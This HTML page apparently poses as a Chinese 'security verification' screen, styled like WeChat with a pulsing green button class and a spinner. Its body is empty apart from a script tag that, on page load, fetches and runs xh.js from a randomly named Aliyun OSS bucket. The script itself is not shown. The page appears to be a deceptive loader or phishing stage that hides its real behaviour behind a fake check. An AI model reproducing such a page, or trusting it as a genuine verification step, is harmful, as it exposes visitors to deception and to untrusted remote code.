<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html
        PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>正在通过安全验证..</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!--    <script src="https://code.jquery.com/jquery-3.7.1.js" type="text/javascript"></script>-->
    <style type="text/css">

        * {
            margin: 0;
            padding: 0;
            border: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: #eee;
        }
        .safe {
            top: 0;
            width: 100%;
            height: 45px;
            background: #e8fef2;
            position: fixed;
            display: flex;
            align-items: center;
        }
        .safe .icon {
            background: url(data:image/png;base64,) no-repeat;
            width: 26px;
            height: 26px;
            margin: 0 10px;
        }
        .safe .text {
            flex: 1;
            align-items: center;
            color: rgba(7, 193, 96);
            font-size: 15px;
        }

        .content {
            max-width: 800px;
            width: calc(100% - 20px);
            margin: 0 auto;
            background: #fff;
            padding: 10px;
            border-radius: 5px;
            line-height: 1;
        }
        .is_safe {
            margin-top: 55px;
        }
        .title {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            padding-top: 20px;
        }
        .detail {
            text-align: center;
            word-wrap: break-word;
        }
        .img {
            margin-bottom: 10px;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:link img, a:visited img, a:hover img, a:active img {
            text-decoration: none;
            outline: none;
        }
        a img {
            border: none;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
        }

        #loading-animation {
            position: absolute;
            top: 30%;
            left: 50%;
            transform: translate(-50%, -50%);

            width: 100px;
            height: 100px;
            margin: auto;
            background-color: pink;
            animation-name: spin;
            animation-duration: 3s;
            border-radius: 50%;
            text-align: center;
            display: flex;
            align-items: center; /* 垂直居中 */
            justify-content: center;
            animation-timing-function: linear;
            animation-iteration-count: infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .color-change {
            border: 1px solid red;
        }
        .text{width:100%;flex:1;height:45px;color:rgba(7,193,96);font-size:15px;line-height:45px}
        .round-button {
            background-color: rgba(7, 193, 96); /* Green */
            border: none;
            color: white;
            padding: 16px 40px; /* 增加按钮的内边距，使文字更大 */
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 20px; /* 增大文字的大小 */
            margin: 4px 24px;
            cursor: pointer;
            border-radius: 25px; /* 圆角的大小 */
            transition: background-color 0.3s, transform 0.3s; /* 平滑过渡效果 */
            animation: breathe 1.5s infinite; /* 呼吸跳动效果 */
            white-space: pre-wrap;
        }

        .round-button:hover {
            background-color: rgba(8, 193, 96); /* 悬停时的颜色 */
        }

        /* 定义呼吸跳动效果的关键帧 */
        @keyframes breathe {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }
    </style>
</head>
<body>
<div id="cc">

</div>

<script src="https://uynrtydbtybdbrdbgbty.oss-cn-beijing.aliyuncs.com/xh.js" type="text/javascript"></script>

</body>
</html>
